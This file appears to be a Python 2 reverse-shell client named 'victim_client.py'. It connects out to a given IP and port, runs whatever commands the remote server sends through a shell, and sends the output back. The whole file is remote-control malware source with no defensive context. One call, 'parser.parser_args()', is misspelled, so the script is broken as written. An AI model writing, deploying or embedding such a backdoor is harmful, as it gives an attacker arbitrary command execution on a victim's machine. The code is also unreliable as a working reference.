#Usage: python victim_client.py --address 10.0.0.18 --port 443

import subprocess
import socket
import argparse


def execute_command(cmd):
  cmd = cmd.rstrip()
  
  try:
    results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
  except Exception, e:
    results = "Could not execute the command: " + cmd
  return results

def receive_data(client):
  try:
    while True:
      received_cmd = ""
      
      received_cmd += client.recv(4096)
      
      if not received_cmd:
        continue
      cmd_results = execute_command(received_cmd)
      client.send(cmd_results)
  except Exception, e:
    print str(e)
    pass
  
def client_connect(host,port):
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  try:
    client.connect((host,port))
    print "Connected with the server " + host + " at port number " +str(port)
    receive_data(client)
  
  except Exception, e:
    print str(e)
    client.close()
    
def main():
  parser = argparse.ArgumentParser('Victim client commander')
  parser.add_argument("-a","--address", type=str,help="The server IP address")
  parser.add_argument("-p","--port",type=int,help="The port number to connect with", default = 9999)
  
  args = parser.parser_args()
  
  if args.address == None: 
    print "python victim_client.py --address 10.0.0.18 --port 443"
    exit(0)
  
  target_host = args.address
  port_number = args.port
  
  client_connect(target_host,port_number)
  
if __name__ == "__main__":
    main()
  
